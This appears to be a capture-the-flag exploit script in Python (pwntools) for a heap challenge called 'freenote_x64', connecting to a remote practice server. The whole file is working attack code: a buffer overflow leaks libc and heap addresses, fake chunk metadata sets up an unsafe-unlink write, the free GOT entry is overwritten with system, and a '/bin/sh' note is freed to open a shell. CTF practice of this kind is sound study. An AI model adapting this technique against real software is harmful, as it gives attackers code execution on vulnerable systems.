from pwn import *

#context.log_level = 'debug'

#p = process('./freenote_x64')
p = remote('node4.buuoj.cn', 28698)
libc = ELF('libc-2.23.buu.so')
elf = ELF('freenote_x64')

ru = lambda s : p.recvuntil(s)
sl = lambda s : p.sendline(s)
sn = lambda s : p.send(s)
rv = lambda s : p.recv(s)
sla = lambda r, s : p.sendlineafter(r, s)
sa = lambda r, s : p.sendafter(r, s)

def debug(s):
    gdb.attach(p, '''
        source ~/libc/loadsym.py
        loadsym ~/libc/2.23/64/libc-2.23.debug.so
    ''' + s)

def alloc(size,content):
    sla(b'choice: ', b'2')
    sla(b'Length of new note: ', str(size).encode())
    sa(b'Enter your note: ', content)

def delete(index):
    sla(b'choice: ', b'4')
    sla(b'number: ', str(index).encode())

def edit(index, len, content):
    sla(b'choice: ', b'3')
    sla(b'number: ', str(index).encode())
    sla(b'Length of note: ', str(len).encode())
    sa(b'Enter your note: ', content)

def show():
    sla(b'choice: ', b'1')

alloc(0x80, b'a' * 0x80) #0
alloc(0x80, b'a' * 0x80) #1
alloc(0x80, b'a' * 0x80) #2
alloc(0x80, b'a' * 0x80) #3
alloc(0x80, b'a' * 0x80) #4

delete(1)
delete(3)

edit(0, 0x90, b'a' * 0x90) #
show()
ru(b'a' * 0x90)
libc_base = u64(rv(6).ljust(8, b'\x00')) - 0x68 - libc.sym['__malloc_hook']
success('libc_base -> {}'.format(hex(libc_base)))

edit(0, 0x98, b'a' * 0x98) #
show()
ru(b'a' * 0x98)
heap_base = u64(ru(b'\x0a')[:-1].ljust(8, b'\x00')) - 0x19d0
success('heap_base -> {}'.format(hex(heap_base)))
heaparray = heap_base + 0x10 + 0x20

fd = heaparray - 0x18
bk = heaparray - 0x10
edit(0, 0x90, p64(0) + p64(0x81) + p64(fd) + p64(bk) + b'a' * 0x60 + p64(0x80) + p64(0x90))
delete(1)

payload = p64(2) + p64(1) + p64(0x8) + p64(elf.got['free'])
payload += b'/bin/sh\x00' + p64(1) * 4 + p64(heap_base + 0x38) + b'\x00' * 0x40

edit(0, 0x90, payload)
edit(0, 0x8, p64(libc_base + libc.sym['system']))

delete(2)
p.interactive()